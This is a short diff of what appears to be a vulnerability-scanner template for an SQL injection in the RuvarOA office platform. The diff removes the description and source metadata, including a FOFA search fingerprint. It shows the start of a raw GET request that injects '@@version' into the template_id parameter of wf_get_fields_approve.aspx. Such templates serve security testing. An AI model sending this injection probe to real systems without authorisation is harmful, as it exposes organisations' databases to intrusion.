@@ -3,12 +3,8 @@ info:
   name: RuvarOA协同办公平台-wf_get_fields_approve-SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kagofoeu10rxw0f6'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kagofoeu10rxw0f6
-    fofa: body="txt_admin_key"
 http:
 - raw:
   - 'GET /WorkFlow/wf_get_fields_approve.aspx?template_id=@@version HTTP/1.1
